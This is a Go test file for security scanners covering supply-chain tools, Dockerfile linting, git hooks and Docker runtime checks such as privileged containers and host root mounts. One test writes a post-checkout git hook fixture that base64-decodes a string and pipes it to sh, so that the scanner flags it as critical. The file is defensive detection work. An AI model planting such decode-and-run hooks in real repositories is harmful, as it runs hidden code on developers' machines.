func TestSupplyChainScanner_NoTargetPathsReturnsNil(t *testing.T) {
	s := code.NewSupplyChainScanner()
	tr := &mockToolRunner{available: map[string]bool{"trivy": true}}
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{ToolRunner: tr})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if findings != nil {
		t.Errorf("expected nil findings when no target paths, got %v", findings)
	}
}

func TestSupplyChainScanner_TrivyWithEmptyOutputNoFindings(t *testing.T) {
	dir := t.TempDir()
	s := code.NewSupplyChainScanner()
	tr := &mockToolRunner{
		available: map[string]bool{"trivy": true},
		outputs:   map[string][]byte{"trivy": []byte(`{}`)},
	}
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{
		ToolRunner:  tr,
		TargetPaths: []string{dir},
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Empty trivy JSON yields no actionable findings.
	_ = findings
}

func TestSupplyChainScanner_RequiredAndOptionalTools(t *testing.T) {
	s := code.NewSupplyChainScanner()
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should return nil")
	}
	opt := s.OptionalTools()
	if len(opt) == 0 {
		t.Error("OptionalTools() should advertise trivy/grype")
	}
}

// ---------------------------------------------------------------------------
// ContainersScanner — functional tests
// ---------------------------------------------------------------------------

func TestContainersScanner_NoTargetPathsReturnsNil(t *testing.T) {
	s := code.NewContainersScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if findings != nil {
		t.Errorf("expected nil findings without target paths, got %v", findings)
	}
}

func TestContainersScanner_NoDockerfilesReturnsNil(t *testing.T) {
	dir := t.TempDir()
	// Write a non-Dockerfile file.
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("hello"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := code.NewContainersScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{dir}})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if findings != nil {
		t.Errorf("expected nil findings without Dockerfiles, got %v", findings)
	}
}

func TestContainersScanner_DockerfileButNoHadolintReturnsNil(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "Dockerfile"), []byte("FROM ubuntu\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := code.NewContainersScanner()
	// No ToolRunner => hadolint unavailable.
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{dir}})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if findings != nil {
		t.Errorf("expected nil findings without hadolint, got %v", findings)
	}
}

func TestContainersScanner_HadolintErrorFindingParsed(t *testing.T) {
	dir := t.TempDir()
	dockerfilePath := filepath.Join(dir, "Dockerfile")
	if err := os.WriteFile(dockerfilePath, []byte("FROM ubuntu\nRUN apt-get install curl\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	// Simulate hadolint returning a JSON finding.
	hadolintJSON := `[{"line":2,"code":"DL3008","message":"Pin versions in apt get install.","level":"warning","file":"` + dockerfilePath + `"}]`
	tr := &mockToolRunner{
		available: map[string]bool{"hadolint": true},
		outputs:   map[string][]byte{"hadolint": []byte(hadolintJSON)},
	}
	s := code.NewContainersScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{
		ToolRunner:  tr,
		TargetPaths: []string{dir},
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected at least one finding from hadolint output")
	}
	f := findings[0]
	if f.Scanner != "containers" {
		t.Errorf("Scanner = %q, want containers", f.Scanner)
	}
	if f.ID == "" {
		t.Error("finding has empty ID")
	}
}

func TestContainersScanner_RequiredAndOptionalTools(t *testing.T) {
	s := code.NewContainersScanner()
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should return nil")
	}
	opt := s.OptionalTools()
	if len(opt) == 0 {
		t.Error("OptionalTools() should advertise hadolint/dockle")
	}
}

// ---------------------------------------------------------------------------
// GitHooksScanner — additional tests (detect/base64 pattern)
// ---------------------------------------------------------------------------

func TestGitHooksScanner_DetectsBase64Pattern(t *testing.T) {
	dir := t.TempDir()
	hooksDir := filepath.Join(dir, ".git", "hooks")
	if err := os.MkdirAll(hooksDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	// post-checkout hook with base64-encoded payload.
	hookContent := "#!/bin/sh\necho aGVsbG8= | base64 -d | sh\n"
	hookPath := filepath.Join(hooksDir, "post-checkout")
	if err := os.WriteFile(hookPath, []byte(hookContent), 0o755); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewGitHooksScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{dir}})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "git_hooks" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for base64 hook, got: %+v", findings)
	}
}

func TestGitHooksScanner_RequiredAndOptionalTools(t *testing.T) {
	s := code.NewGitHooksScanner()
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should return nil")
	}
	if s.OptionalTools() != nil {
		t.Error("OptionalTools() should return nil")
	}
}

// ---------------------------------------------------------------------------
// DockerRuntimeScanner — ToolRunner coverage for checkRunningContainers
// ---------------------------------------------------------------------------

// TestDockerRuntimeScanner_HostNetworkContainer verifies that a container with
// host networking is flagged HIGH.
func TestDockerRuntimeScanner_HostNetworkContainer(t *testing.T) {
	dir := t.TempDir()
	socketPath := filepath.Join(dir, "docker.sock")
	// Create a restricted socket so socket-permissions check passes clean.
	if err := os.WriteFile(socketPath, []byte{}, 0o660); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	psJSON := `{"ID":"abc123","Names":"myapp","Image":"nginx","NetworkMode":"host","Mounts":""}` + "\n"
	tr := &mockToolRunner{
		available: map[string]bool{"docker": true},
		outputs: map[string][]byte{
			"docker": []byte(psJSON),
		},
	}

	s := code.NewDockerRuntimeScannerWithSocket(socketPath)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{ToolRunner: tr})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevHigh && strings.Contains(f.Title, "host networking") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected HIGH finding for host-network container, got: %+v", findings)
	}
}

// TestDockerRuntimeScanner_HostRootMountContainer verifies that a container
// with the host root filesystem mounted is flagged CRITICAL.
func TestDockerRuntimeScanner_HostRootMountContainer(t *testing.T) {
	dir := t.TempDir()
	socketPath := filepath.Join(dir, "docker.sock")
	if err := os.WriteFile(socketPath, []byte{}, 0o660); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	psJSON := `{"ID":"def456","Names":"dangerous","Image":"alpine","NetworkMode":"bridge","Mounts":"/:/host"}` + "\n"
	tr := &mockToolRunner{
		available: map[string]bool{"docker": true},
		outputs: map[string][]byte{
			"docker": []byte(psJSON),
		},
	}

	s := code.NewDockerRuntimeScannerWithSocket(socketPath)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{ToolRunner: tr})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical && strings.Contains(f.Title, "host root filesystem") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for host root mount, got: %+v", findings)
	}
}

// TestDockerRuntimeScanner_DockerNotAvailable verifies that when the docker
// tool is not available via ToolRunner, checkRunningContainers returns nil.
func TestDockerRuntimeScanner_DockerNotAvailable(t *testing.T) {
	dir := t.TempDir()
	socketPath := filepath.Join(dir, "docker.sock")
	if err := os.WriteFile(socketPath, []byte{}, 0o660); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	tr := &mockToolRunner{
		available: map[string]bool{"docker": false},
	}

	s := code.NewDockerRuntimeScannerWithSocket(socketPath)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{ToolRunner: tr})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	for _, f := range findings {
		if strings.Contains(f.Title, "host networking") || strings.Contains(f.Title, "privileged") {
			t.Errorf("unexpected docker container finding when docker unavailable: %+v", f)
		}
	}
}

// TestDockerRuntimeScanner_InspectPrivilegedContainer verifies that a privileged
// container detected via docker inspect is flagged CRITICAL.
func TestDockerRuntimeScanner_InspectPrivilegedContainer(t *testing.T) {
	dir := t.TempDir()
	socketPath := filepath.Join(dir, "docker.sock")
	if err := os.WriteFile(socketPath, []byte{}, 0o660); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	// docker ps -q returns a container ID; docker inspect returns JSON array.
	inspectJSON := `[{"Id":"abc123def456","Name":"/mycontainer","HostConfig":{"Privileged":true},"Config":{"User":"root"}}]`
	tr := &mockToolRunner{
		available: map[string]bool{"docker": true},
		outputs: map[string][]byte{
			// Both "docker ps --format" and "docker ps -q" and "docker inspect" use the same key.
			// The mock returns the same output for all docker calls; that's fine because
			// "docker ps --format json" output won't parse as inspect JSON and vice versa.
			"docker": []byte(inspectJSON),
		},
	}

	s := code.NewDockerRuntimeScannerWithSocket(socketPath)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{ToolRunner: tr})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	// With the inspect JSON output, inspectContainers should flag privileged=true.
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical && strings.Contains(f.Title, "privileged") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for privileged container, got: %+v", findings)
	}
}
